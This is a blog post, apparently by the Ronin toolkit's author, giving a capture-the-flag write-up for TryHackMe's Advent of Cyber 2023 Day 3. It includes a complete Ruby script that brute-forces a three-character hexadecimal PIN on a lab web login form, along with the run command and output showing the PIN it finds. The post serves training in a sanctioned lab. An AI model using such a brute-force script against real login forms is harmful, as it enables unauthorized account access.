---
layout: post
title: Solving Advent of Cyber 2023 Day 3 using Ronin
author: postmodern
tags:
  - adventofcyber
  - adventofcyber2023
  - ctf
  - tryhackme
  - ruby
  - ronin
  - writeup
---

This year I decided to try using Ronin to solve the [Advent of Cyber 2023]
challenges. Let's see how far I can get.

The Day 3 challenge involves a basic HTTP form which accepts a three digit PIN
code. The PIN code can contain numeric or uppercase hexadecimal numbers.
The instructions for the challenge recommends using the [crunch] utility to
generate a wordlist file containing every three character combination of
uppercase hexadecimal characters and then use [hydra] to bruteforce the login
form. Instead, we're going to do all of that in a single Ruby script using
Ronin and it's powerful libraries.

First, we will test the HTTP form by intentionally entering an incorrect PIN
code and seeing what the response is. In the Network tab of Chrome DevTools,
we can see a failed login attempt results in a HTTP 302 response with a 
`Location` header of `error.php`. Since we don't know what a valid login
HTTP response looks like, we will have to assume anything that is not a
HTTP 302 redirect to `error.php` can be considered a successful login.

Next we will write a bruteforcing Ruby script which will send every possible
three character combination of numbers and uppercase hexadecimal characters.
To do that we will use the [chars] library, which provides a
[Chars::UPPERCASE_HEXADECIMAL] constant containing characters `0` - `9` and
`A` - `F`. Then we will use the [wordlist] library to generate every character
combination of uppercase hexadecimal characters. Then we will use
[ronin-support] to establish a persistent HTTP connection and send login
requestions until a non-HTTP 302 redirect response is returned.

```ruby
require 'ronin/support'
require 'wordlist'
require 'chars'

include Ronin::Support

charset  = Chars::UPPERCASE_HEXADECIMAL.chars
wordlist = Wordlist::Words.new(charset) ** 3

ip   = ARGV[0]
http = http_connect(ip,8000)

response       = http.get('/pin.php')
session_cookie = response['Set-Cookie']

wordlist.each do |pin|
  print_info "Trying #{pin} ..."
  response = http.post('/login.php', form_data: {pin: pin},
                                     cookie:    session_cookie)

  if response.code == '302' && response['Location'] == 'error.php'
    # login failed, keep trying ...
  else
    print_success "Jack Pot! #{pin}"
    exit 0
  end
end
```

Now to run the bruteforcing Ruby script against the target machine IP.
We will add the `--jit` option to try to speed it up our Ruby script as much as
possible.

```shell
$ ruby --jit bruteforce.rb 10.10.185.45
```
and eventually we will hit the correct PIN code:

```
...
[*] Trying 6F2 ...
[*] Trying 6F3 ...
[*] Trying 6F4 ...
[*] Trying 6F5 ...
[+] Jack Pot! 6F5
```

As you can see, Ronin provides you with powerful libraries that can make solving
CTF challenges easy and fun.

[Advent of Cyber 2023]: https://tryhackme.com/room/adventofcyber2023
[crunch]: https://www.kali.org/tools/crunch/
[hydra]: https://www.kali.org/tools/hydra/
[chars]: https://github.com/postmodern/chars.rb#readme
[wordlist]: https://github.com/postmodern/wordlist.rb#readme
[ronin-support]: https://github.com/ronin-rb/ronin-support#readme
